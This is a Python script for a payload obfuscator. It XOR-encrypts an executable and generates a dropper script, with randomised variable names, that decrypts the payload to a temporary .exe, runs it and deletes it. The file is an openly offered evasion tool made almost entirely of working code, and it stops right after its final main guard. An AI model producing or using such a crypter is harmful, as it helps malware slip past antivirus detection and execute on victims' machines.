#!/usr/bin/env python3

import os
import sys
import random
import string

def generate_random_key(length=32):
    """Generate random XOR key"""
    return bytes([random.randint(1, 255) for _ in range(length)])

def xor_encrypt(data, key):
    """XOR encrypt data with key"""
    encrypted = bytearray()
    key_len = len(key)
    
    for i, byte in enumerate(data):
        encrypted.append(byte ^ key[i % key_len])
    
    return bytes(encrypted)

def create_xor_payload(payload_file, output_file):
    """Create XOR encrypted payload"""
    try:
        with open(payload_file, 'rb') as f:
            payload_data = f.read()
        
        # Generate random key
        key = generate_random_key()
        
        # Encrypt payload
        encrypted_payload = xor_encrypt(payload_data, key)
        
        # Create Python script with encrypted payload
        var_names = [generate_random_string() for _ in range(5)]
        
        script_content = f'''#!/usr/bin/env python3
import subprocess
import tempfile
import os

def {var_names[0]}():
    {var_names[1]} = {list(key)}
    {var_names[2]} = {list(encrypted_payload)}
    
    {var_names[3]} = bytearray()
    key_len = len({var_names[1]})
    
    for i, byte in enumerate({var_names[2]}):
        {var_names[3]}.append(byte ^ {var_names[1]}[i % key_len])
    
    with tempfile.NamedTemporaryFile(delete=False, suffix='.exe') as {var_names[4]}:
        {var_names[4]}.write(bytes({var_names[3]}))
        temp_path = {var_names[4]}.name
    
    try:
        subprocess.run([temp_path], check=True)
    finally:
        os.unlink(temp_path)

if __name__ == "__main__":
    {var_names[0]}()
'''
        
        with open(output_file, 'w') as f:
            f.write(script_content)
        
        print(f"XOR obfuscated payload created: {output_file}")
        return True
        
    except Exception as e:
        print(f"Error creating XOR payload: {e}")
        return False

def generate_random_string(length=12):
    """Generate random string for variable names"""
    return ''.join(random.choices(string.ascii_letters, k=length))

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 xor_obfuscator.py <payload_file> <output_file>")
        sys.exit(1)
    
    payload_file = sys.argv[1]
    output_file = sys.argv[2]
    
    print(f"Creating XOR obfuscated payload from: {payload_file}")
    
    if create_xor_payload(payload_file, output_file):
        print("XOR obfuscation successful!")
        os.chmod(output_file, 0o755)
    else:
        print("XOR obfuscation failed!")

if __name__ == "__main__":
